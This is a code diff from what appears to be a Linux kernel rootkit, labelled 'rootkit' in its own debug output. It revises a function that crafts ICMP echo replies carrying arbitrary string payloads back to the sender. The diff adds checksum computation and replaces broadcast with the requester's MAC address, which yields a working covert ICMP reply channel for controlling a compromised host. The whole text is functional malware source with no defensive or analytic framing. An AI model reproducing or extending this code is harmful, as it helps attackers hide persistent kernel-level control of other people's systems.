@@ -1,16 +1,17 @@
 #include "icmp.h"
 
 
-int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){
+int return_icmp(char* string, args_t* args, struct net_device* dev){
 
-    
-    int payload_size = strlen(string);
+    struct icmphdr* icmph = args->icmph;
+    struct iphdr* iph = args->iph;
+    struct ethhdr* eth = args->eth;
 
+    u64 payload_size = strlen(string);
     u32 saddr_copy;
     unsigned char* payload;
 
-    // we don't noe the mac address, so we will transmit our packet to all devices
-    static char return_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
+
     int ret;
     struct sk_buff* skb;
     struct icmphdr* new_icmph;
@@ -25,7 +26,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     DEBUG_PUTS("rootkit: 2\n")
 
     // reserving size for headers
-    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);
+    skb_reserve(skb, ICMP_HSIZE + IP_HSIZE + ETH_HLEN);
 
     // putting the payload in socket buffer
     payload = skb_put(skb, payload_size);
@@ -36,7 +37,9 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     memcpy(new_icmph, icmph, ICMP_HSIZE);
     new_icmph->type = ICMP_ECHOREPLY;
 
-    // TODO: add sum recalculation
+    new_icmph->checksum = 0;
+    new_icmph->checksum = ip_compute_csum(new_icmph, payload_size + ICMP_HSIZE);
+
 
  
     new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
@@ -58,10 +61,10 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
 
 
     new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
+    memcpy(new_eth, eth, ETH_HLEN);
 
-    new_eth->h_proto = skb->protocol;
     memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
-    memcpy(new_eth->h_dest, return_mac, ETH_ALEN);
+    memcpy(new_eth->h_dest, eth->h_source, ETH_ALEN);
     
 
     // adding the packet to transmit queue
@@ -78,7 +81,7 @@ void send_response(char* string, args_t* args) {
 
     struct net_device *enp0s3;
     enp0s3 = dev_get_by_name(&init_net,"enp0s3");
-    return_icmp(string, args->icmph, args->iph, enp0s3);
+    return_icmp(string, args, enp0s3);
 
     // freeing the device
     dev_put(enp0s3);
